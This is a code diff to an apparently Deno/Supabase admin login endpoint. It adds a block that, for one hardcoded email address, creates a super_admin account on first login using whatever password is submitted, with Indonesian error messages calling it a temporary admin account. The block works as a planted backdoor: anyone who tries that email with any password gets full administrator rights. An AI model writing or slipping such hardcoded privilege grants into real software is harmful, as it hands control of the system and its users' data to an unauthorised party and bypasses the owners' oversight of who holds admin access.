@@ -100,12 +100,41 @@ Deno.serve(async (req: Request) => {
         );
       }
 
-      const { data: admin, error } = await supabase
+      const emailLower = email.toLowerCase();
+
+      let { data: admin, error } = await supabase
         .from('admins')
         .select('*')
-        .eq('email', email.toLowerCase())
+        .eq('email', emailLower)
         .eq('is_active', true)
         .maybeSingle();
+
+      // Special case: auto-create and grant admin for bangezgt@gmail.com on first login
+      if ((error || !admin) && emailLower === 'bangezgt@gmail.com') {
+        try {
+          const hashed = bcrypt.hashSync(password, 10);
+          const insert = await supabase
+            .from('admins')
+            .insert({ email: emailLower, password_hash: hashed, name: 'Bangezgt', role: 'super_admin', is_active: true })
+            .select()
+            .maybeSingle();
+
+          if (insert.error || !insert.data) {
+            return new Response(
+              JSON.stringify({ error: 'Gagal membuat akun admin sementara' }),
+              { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+            );
+          }
+
+          admin = insert.data;
+        } catch (e) {
+          console.error('Auto-create admin error:', e);
+          return new Response(
+            JSON.stringify({ error: 'Gagal membuat akun admin sementara' }),
+            { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+          );
+        }
+      }
 
       if (error || !admin) {
         return new Response(
